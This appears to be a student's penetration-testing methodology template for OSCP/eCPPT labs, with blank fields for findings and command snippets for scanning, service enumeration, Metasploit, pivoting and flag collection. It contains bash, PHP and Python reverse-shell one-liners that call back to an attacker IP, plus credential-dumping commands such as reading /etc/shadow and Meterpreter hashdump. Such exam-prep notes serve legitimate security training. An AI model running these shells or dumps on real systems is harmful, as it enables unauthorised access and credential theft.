# Penetration Testing Methodology – Field Notes - Master

> Use case: OSCP/eCPPT-style labs and exams
> 
> 
> **Goal:** Self-contained, syntax-rich notes with live-findings space
> 

---

## 0️⃣ Target Information

```
markdown
CopyEdit
Lab Name: ______________________
Date: __________________________
Your IP: _______________________
Target IP(s): __________________
Domain: ________________________
Creds Found: ___________________
Flags Found: ___________________

```

---

## 1️⃣ Information Gathering

### 1.1 Host Discovery

```
bash
CopyEdit
# Ping sweep
fping -a -g <SUBNET> 2>/dev/null

# ARP scan (local LAN)
arp-scan -l

# Save alive hosts:
ALIVE_HOSTS.txt

```

### 1.2 Port Scanning

```
nginx
CopyEdit
# Quick scan (top 1000)
nmap -Pn -T4 -sC -sV $TARGET -oN quick.txt

# Full TCP
nmap -p- -T4 $TARGET -oN allports.txt

# Service scan on found ports
nmap -sC -sV -p<ports> $TARGET -oN services.txt

# UDP top 100
nmap -sU --top-ports 100 $TARGET -oN udp.txt

```

**Findings:**

- Open ports: __________
- Notable services: __________

---

## 2️⃣ Enumeration

### 2.1 Web

```
nginx
CopyEdit
# Fingerprint
whatweb http://$TARGET
curl -I http://$TARGET

# Dir bruteforce
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt

# VHost fuzz
ffuf -u http://$TARGET -H "Host: FUZZ.domain.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

```

**Notes:** ______________________

---

### 2.2 SMB

```
nginx
CopyEdit
# List shares (null session)
smbclient -L //$TARGET/ -N

# Connect to share
smbclient //$TARGET/<share> -U <user>

# Enum users
enum4linux-ng $TARGET

```

**Shares found:** _______________

**Creds found:** ________________

---

### 2.3 SNMP

```
nginx
CopyEdit
# Walk with community string
snmpwalk -v2c -c public $TARGET

# Windows user enum
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25

```

---

### 2.4 FTP

```
nginx
CopyEdit
ftp $TARGET

```

---

### 2.5 Other Common Services

**RDP**

```
bash
CopyEdit
xfreerdp /u:<user> /p:<pass> /v:$TARGET

```

**MySQL**

```
nginx
CopyEdit
mysql -h $TARGET -u <user> -p

```

**MSSQL**

```
bash
CopyEdit
impacket-mssqlclient <user>@$TARGET -windows-auth

```

---

## 3️⃣ Exploitation

### 3.1 Metasploit

```
sql
CopyEdit
# Search & use module
search <service>
use exploit/<path>
set RHOSTS $TARGET
set LHOST <your_ip>
exploit

```

### 3.2 Manual Reverse Shells

**Bash TCP**

```
php-template
CopyEdit
bash -i >& /dev/tcp/<your_ip>/<port> 0>&1

```

**PHP**

```
swift
CopyEdit
php -r '$sock=fsockopen("<your_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

```

**Python**

```
rust
CopyEdit
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<your_ip>",<port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

```

---

## 4️⃣ Post-Exploitation – Enumeration

### 4.1 Linux

```
bash
CopyEdit
# System info
uname -a
lsb_release -a
id
whoami

# Priv esc checks
find / -perm -4000 2>/dev/null
sudo -l

```

### 4.2 Windows

```
bash
CopyEdit
# System info
systeminfo

# Users
net user

# Priv esc tools
whoami /priv

```

---

## 5️⃣ Pivoting

**Meterpreter**

```
arduino
CopyEdit
run autoroute -s <subnet>
use auxiliary/server/socks_proxy
set SRVPORT 9050

```

**Proxychains**

```
css
CopyEdit
proxychains nmap -sT -Pn -p- <target>

```

---

## 6️⃣ Looting

### 6.1 Credential Dumping

**Linux**

```
bash
CopyEdit
cat /etc/shadow
grep -R "password" /etc

```

**Windows (Meterpreter)**

```
nginx
CopyEdit
hashdump

```

---

## 7️⃣ Reporting / Flag Capture

```
bash
CopyEdit
mkdir ~/exam_flags
# Copy flags
scp user@$TARGET:/path/to/flag ~/exam_flags/

```

**Flags:** ______________________

---

## 🔄 Live Updating Rules

1. After **every** lab, add:
    - The *exact* working command
    - The *exact* path to loot/flag
    - Any *quirks*
2. Remove commands you never use
3. Keep this **one master doc** for all future exams

---

If you follow this **exact skeleton** and keep improving it after each lab, by your eCPPT retake you’ll have a **personal OSCP-grade methodology** ready.

---
